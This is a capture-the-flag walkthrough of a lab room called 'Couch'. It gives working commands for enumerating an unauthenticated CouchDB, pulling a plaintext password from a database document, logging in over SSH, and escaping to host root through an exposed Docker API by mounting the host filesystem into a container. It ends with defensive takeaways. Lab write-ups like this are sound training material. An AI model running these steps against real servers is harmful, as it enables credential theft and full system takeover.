# Couch — Full Walkthrough

**Room:** Couch | **Difficulty:** Easy | **Flags:** 2

| Detail | Value |
|--------|-------|
| Target IP | `10.49.183.169` |
| Attack IP | `10.x.x.x` |
| OS | Linux |

---

## Flags Overview

| # | Method |
|---|--------|
| 01 | Unauthenticated CouchDB → credential extraction → SSH |
| 02 | Exposed Docker API → container escape → root |

---

## Phase 1: Reconnaissance

```bash
nmap -sC -sV -p- 10.49.183.169 -oN nmap_scan.txt
```

**Open Ports:**

| Port | Service |
|------|---------|
| 22/tcp | SSH |
| 5984/tcp | CouchDB 1.6.1 (unauthenticated) |

---

## Phase 2: CouchDB Enumeration

CouchDB was accessible without authentication. Interacted with its REST API:

```bash
# List all databases
curl http://10.49.183.169:5984/_all_dbs
```

**Databases found:** `["_replicator","_users","couch","secret","test_suite_db","test_suite_db2"]`

```bash
# Check the 'secret' database
curl http://10.49.183.169:5984/secret/a1320dd69fb4570d0a3d26df4e000be7
```

**Credentials found:** `{"passwordbackup":"atena:t4qfzcc4qN##"}`

---

## Phase 3: SSH Access — User Flag

```bash
ssh atena@10.49.183.169
# Password: t4qfzcc4qN##
```

**Flag 01:** `cat user.txt`

---

## Phase 4: Privilege Escalation — Docker Escape

### Discovery

Checked for the Docker API locally:

```bash
netstat -tulpn
```

**Found:** `127.0.0.1:2375` — Docker API listening without TLS authentication.

### Exploitation

Executed a Docker container that mounts the host's root filesystem:

```bash
# Read root flag directly
docker -H 127.0.0.1:2375 run -v /:/mnt alpine chroot /mnt cat /root/root.txt
```

**Flag 02 captured.**

### Bonus — Interactive Root Shell

```bash
docker -H 127.0.0.1:2375 run -it -v /:/hostos alpine chroot /hostos /bin/bash
```

---

## Vulnerability Chain

1. **CouchDB no authentication** — Instance exposed on 5984 without `require_valid_user`
2. **Plaintext credentials** — Passwords stored unencrypted in database documents
3. **SSH credential reuse** — Stolen CouchDB credentials work for SSH
4. **Docker API exposure** — Docker daemon bound to TCP port 2375 without TLS
5. **Container escape** — Mounting host root filesystem into a container grants host root access

## Key Takeaways

- **Always secure databases** — CouchDB should require authentication
- **Don't store passwords in plaintext** — even in internal databases
- **Don't reuse passwords** across services
- **Secure the Docker API** — never expose it without TLS, even locally
- **Container escape via host mount** is a common and powerful attack
